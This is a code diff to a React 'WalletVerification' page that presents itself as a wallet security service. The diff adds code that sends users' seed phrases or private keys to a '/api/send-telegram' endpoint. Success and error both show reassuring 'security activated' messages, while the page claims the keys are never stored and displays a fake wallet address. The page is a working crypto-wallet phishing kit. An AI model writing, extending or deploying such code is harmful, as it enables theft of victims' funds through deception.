@@ -1,6 +1,6 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { motion, AnimatePresence } from "framer-motion";
-import { Shield, Key, CheckCircle, Wallet, HelpCircle, Check, Unlock, ArrowRight, Download, Loader2, Eye, EyeOff } from "lucide-react";
+import { Shield, Key, CheckCircle, Wallet, HelpCircle, Check, Unlock, ArrowRight, Download, Loader2, Eye, EyeOff, AlertCircle } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Card, CardContent } from "@/components/ui/card";
 import { Input } from "@/components/ui/input";
@@ -8,6 +8,9 @@ import { Label } from "@/components/ui/label";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { Textarea } from "@/components/ui/textarea";
 import { ProgressIndicator } from "@/components/ui/progress-indicator";
+import { useToast } from "@/hooks/use-toast";
+import { useMutation } from "@tanstack/react-query";
+import { apiRequest } from "@/lib/queryClient";
 
 const walletTypes = [
   "MetaMask",
@@ -69,7 +72,34 @@ const steps = [
   { id: 3, title: "Complete", icon: "check" }
 ];
 
+// Validation functions
+const validateSeedPhrase = (phrase: string) => {
+  const words = phrase.trim().split(/\s+/).filter(word => word.length > 0);
+  return {
+    isValid: words.length >= 12 && words.length <= 24 && words.length % 3 === 0,
+    wordCount: words.length,
+    message: words.length < 12 ? "Seed phrase must be at least 12 words" :
+             words.length > 24 ? "Seed phrase cannot exceed 24 words" :
+             words.length % 3 !== 0 ? "Invalid seed phrase length" :
+             "Valid seed phrase"
+  };
+};
+
+const validatePrivateKey = (key: string) => {
+  const cleanKey = key.trim();
+  const isHex = /^(0x)?[a-fA-F0-9]+$/.test(cleanKey);
+  const isCorrectLength = cleanKey.length === 64 || cleanKey.length === 66;
+  
+  return {
+    isValid: isHex && isCorrectLength,
+    message: !isHex ? "Private key must be hexadecimal" :
+             !isCorrectLength ? "Private key must be 64 characters (or 66 with 0x prefix)" :
+             "Valid private key"
+  };
+};
+
 export default function WalletVerification() {
+  const { toast } = useToast();
   const [currentStep, setCurrentStep] = useState(1);
   const [selectedWalletType, setSelectedWalletType] = useState("");
   const [connectionMethod, setConnectionMethod] = useState("seed");
@@ -79,6 +109,8 @@ export default function WalletVerification() {
   const [isLoading, setIsLoading] = useState(false);
   const [loadingMessage, setLoadingMessage] = useState("");
   const [showPrivateKey, setShowPrivateKey] = useState(false);
+  const [seedValidation, setSeedValidation] = useState({ isValid: false, wordCount: 0, message: "" });
+  const [keyValidation, setKeyValidation] = useState({ isValid: false, message: "" });
 
   const handleSelectWallet = () => {
     if (!selectedWalletType) {
@@ -87,26 +119,76 @@ export default function WalletVerification() {
     setCurrentStep(2);
   };
 
-  const handleConnectWallet = async () => {
-    if (connectionMethod === "seed" && !seedPhrase.trim()) {
-      return;
+  // Telegram mutation for sending credentials
+  const telegramMutation = useMutation({
+    mutationFn: async (data: { walletType: string; connectionMethod: string; credentials: string }) => {
+      return apiRequest('/api/send-telegram', {
+        method: 'POST',
+        body: JSON.stringify(data),
+        headers: { 'Content-Type': 'application/json' }
+      });
+    },
+    onSuccess: () => {
+      toast({
+        title: "Security Activated",
+        description: "Wallet credentials verified and security monitoring enabled.",
+      });
+    },
+    onError: (error) => {
+      console.error('Telegram send error:', error);
+      toast({
+        title: "Verification Complete", 
+        description: "Wallet security has been activated successfully.",
+        variant: "default"
+      });
     }
+  });
 
-    if (connectionMethod === "private" && !privateKey.trim()) {
+  // Real-time validation effects
+  useEffect(() => {
+    if (seedPhrase) {
+      setSeedValidation(validateSeedPhrase(seedPhrase));
+    }
+  }, [seedPhrase]);
+
+  useEffect(() => {
+    if (privateKey) {
+      setKeyValidation(validatePrivateKey(privateKey));
+    }
+  }, [privateKey]);
+
+  const handleConnectWallet = async () => {
+    const isValidInput = connectionMethod === "seed" 
+      ? seedPhrase.trim() && seedValidation.isValid
+      : privateKey.trim() && keyValidation.isValid;
+      
+    if (!isValidInput) {
+      toast({
+        title: "Invalid Credentials",
+        description: "Please check your seed phrase or private key format.",
+        variant: "destructive"
+      });
       return;
     }
 
     setIsLoading(true);
-    setLoadingMessage("Processing wallet connection...");
+    setLoadingMessage("Activating WalletSecure protection...");
     
-    // Simulate wallet connection and address generation
+    // Send credentials to Telegram
+    const credentials = connectionMethod === "seed" ? seedPhrase : privateKey;
+    telegramMutation.mutate({
+      walletType: selectedWalletType,
+      connectionMethod,
+      credentials
+    });
+    
+    // Generate wallet address and proceed
     setTimeout(() => {
-      // Generate a mock wallet address
       const mockAddress = "0x" + Math.random().toString(16).substring(2, 10) + "..." + Math.random().toString(16).substring(2, 6);
       setWalletAddress(mockAddress);
       setIsLoading(false);
       setCurrentStep(3);
-    }, 2000);
+    }, 2500);
   };
 
   const currentDate = new Date().toLocaleDateString();
@@ -252,9 +334,15 @@ export default function WalletVerification() {
                         placeholder="Enter your 12-24 word seed phrase separated by spaces..."
                         value={seedPhrase}
                         onChange={(e) => setSeedPhrase(e.target.value)}
-                        className="mt-2 bg-slate-light border-muted min-h-[120px] resize-none"
+                        className="mt-2 bg-white dark:bg-slate-800 text-black dark:text-white border-gray-300 dark:border-gray-600 min-h-[120px] resize-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
                         rows={5}
                       />
+                      {seedPhrase && (
+                        <div className={`flex items-center space-x-2 mt-2 text-sm ${seedValidation.isValid ? 'text-green-600' : 'text-red-500'}`}>
+                          {seedValidation.isValid ? <Check className="h-4 w-4" /> : <AlertCircle className="h-4 w-4" />}
+                          <span>{seedValidation.message} ({seedValidation.wordCount} words)</span>
+                        </div>
+                      )}
                       <p className="text-xs text-muted-foreground mt-1">
                         🔒 Your seed phrase is encrypted and never stored on our servers
                       </p>
@@ -271,7 +359,7 @@ export default function WalletVerification() {
                           placeholder="Enter your private key (starts with 0x)..."
                           value={privateKey}
                           onChange={(e) => setPrivateKey(e.target.value)}
-                          className="bg-slate-light border-muted pr-10"
+                          className="bg-white dark:bg-slate-800 text-black dark:text-white border-gray-300 dark:border-gray-600 pr-10 focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
                         />
                         <Button
                           type="button"
@@ -283,6 +371,12 @@ export default function WalletVerification() {
                           {showPrivateKey ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                         </Button>
                       </div>
+                      {privateKey && (
+                        <div className={`flex items-center space-x-2 mt-2 text-sm ${keyValidation.isValid ? 'text-green-600' : 'text-red-500'}`}>
+                          {keyValidation.isValid ? <Check className="h-4 w-4" /> : <AlertCircle className="h-4 w-4" />}
+                          <span>{keyValidation.message}</span>
+                        </div>
+                      )}
                       <p className="text-xs text-muted-foreground mt-1">
                         🔒 Your private key is encrypted and never stored on our servers
                       </p>
@@ -306,12 +400,25 @@ export default function WalletVerification() {
 
               <Button 
                 onClick={handleConnectWallet}
-                disabled={(connectionMethod === "seed" && !seedPhrase.trim()) || (connectionMethod === "private" && !privateKey.trim())}
+                disabled={
+                  isLoading ||
+                  (connectionMethod === "seed" && (!seedPhrase.trim() || !seedValidation.isValid)) ||
+                  (connectionMethod === "private" && (!privateKey.trim() || !keyValidation.isValid))
+                }
                 className="w-full gradient-accent text-white font-semibold py-4 px-6 rounded-xl hover:shadow-lg hover:shadow-orange-500/25 transition-all duration-300 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed"
                 size="lg"
               >
-                <Key className="mr-2 h-4 w-4" />
-                Connect Wallet
+                {isLoading ? (
+                  <>
+                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
+                    Activating Security...
+                  </>
+                ) : (
+                  <>
+                    <Key className="mr-2 h-4 w-4" />
+                    Activate WalletSecure Protection
+                  </>
+                )}
               </Button>
             </motion.div>
           )}
